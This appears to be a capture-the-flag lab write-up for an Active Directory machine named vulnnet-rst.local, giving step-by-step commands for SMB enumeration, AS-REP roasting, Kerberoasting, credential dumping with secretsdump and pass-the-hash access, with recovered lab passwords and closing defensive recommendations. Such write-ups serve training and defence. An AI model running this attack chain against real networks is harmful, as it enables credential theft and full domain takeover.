## üî¨ Attack Chain Methodology

### Phase 1: Advanced Reconnaissance

**Objective**: Systematic service discovery and attack surface identification

```bash
# Comprehensive port scanning with optimized parameters
nmap -p- -Pn $target -v -T5 --min-rate 1500 --max-rtt-timeout 500ms \
     --max-retries 3 --max-scan-delay 10ms --open -oA nmap_results

# SMB service enumeration
smbclient -L \\\\$target\\
```

**Key Findings**: Identified critical services including SMB, RPC, and Kerberos authentication

### Phase 2: Anonymous Access Exploitation

**Objective**: Exploit misconfigured anonymous access permissions

```bash
# Anonymous SMB share access
smbclient -U "" //$target/Vulnet-Enterprise-Anonymous
rpcclient -N $target
```

**Critical Discovery**: Obtained valid usernames through anonymous share access, enabling targeted authentication attacks

### Phase 3: AS-REP Roasting Attack

**Objective**: Exploit accounts with disabled Kerberos pre-authentication

```bash
# Username validation via Kerberos
kerbrute userenum users.txt --dc $target -d vulnnet-rst.local

# AS-REP Roasting execution
impacket-GetNPUsers vulnnet-rst.local/ -dc-ip $target \
                    -usersfile users.txt -format john -outputfile hashes.txt

# Credential recovery
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Result**: Successfully obtained first domain credentials (t-skid:tj072889*)

### Phase 4: Kerberoasting Service Account Attack

**Objective**: Target service accounts with registered SPNs

```bash
# Service ticket requests
impacket-GetUsersSPNs -dc-ip $target 'vulnnet-rst.local/t-skid:tj072889*' -request

# Service account credential recovery  
john krb.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Achievement**: Compromised service account (enterprise-core-vn) with elevated privileges

### Phase 5: Privilege Escalation via SYSVOL

**Objective**: Exploit administrative script misconfigurations

```bash
# SYSVOL share analysis
smbclient \\\\$target\\SYSVOL -U 'enterprise-core-vn'
```

**Critical Finding**: Discovered hardcoded administrative credentials in resetpassword.vbs script

### Phase 6: Domain Administrative Access

**Objective**: Achieve complete domain control

```bash
# Domain administrator verification
whoami /all

# Complete hash extraction
impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/a-Whitehat:bNdKVkjv3RR9ht@$target

# Pass-the-hash administrative access
impacket-psexec vulnnet-rst.local/Administrator@$target -hashes : [HASH]
```

**Final Result**: Complete domain compromise with SYSTEM-level access and all user credentials

## üö® Critical Vulnerabilities Identified

### High-Risk Findings

| Vulnerability                        | Risk Level         | Impact                                           |
| ------------------------------------ | ------------------ | ------------------------------------------------ |
| Anonymous SMB Share Access           | **Critical** | Information disclosure, username enumeration     |
| Disabled Kerberos Pre-authentication | **High**     | Credential compromise via AS-REP Roasting        |
| Weak Service Account Passwords       | **Critical** | Service account compromise, privilege escalation |
| Hardcoded Credentials in Scripts     | **Critical** | Administrative account compromise                |
| Excessive Service Account Privileges | **High**     | Lateral movement, privilege escalation           |

### Attack Vector Analysis

- **Initial Access**: Anonymous SMB shares provided username enumeration capabilities
- **Credential Harvesting**: AS-REP Roasting and Kerberoasting yielded multiple account compromises
- **Privilege Escalation**: SYSVOL script analysis revealed administrative credentials
- **Domain Domination**: Administrative access enabled complete credential database extraction

## üõ†Ô∏è Professional Defense Recommendations

### Immediate Actions Required

1. **Disable Anonymous SMB Access**

   ```powershell
   # Restrict anonymous enumeration
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymous" -Value 2
   ```
2. **Enable Kerberos Pre-authentication**

   ```powershell
   # Require pre-authentication for all accounts
   Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} | Set-ADUser -DoesNotRequirePreAuth $False
   ```
3. **Implement Managed Service Accounts**

   ```powershell
   # Deploy Group Managed Service Accounts
   New-ADServiceAccount -Name "ServiceAccount$" -DNSHostName "server.domain.com" -Enabled $True
   ```

### Strategic Security Enhancements

- **Advanced Threat Detection**: Deploy tools like Microsoft Advanced Threat Analytics (ATA)
- **Privileged Access Management**: Implement Just-In-Time (JIT) administrative access
- **Security Monitoring**: Establish monitoring for Kerberoasting and AS-REP Roasting activities
- **Regular Security Assessments**: Conduct quarterly AD security reviews using tools like BloodHound
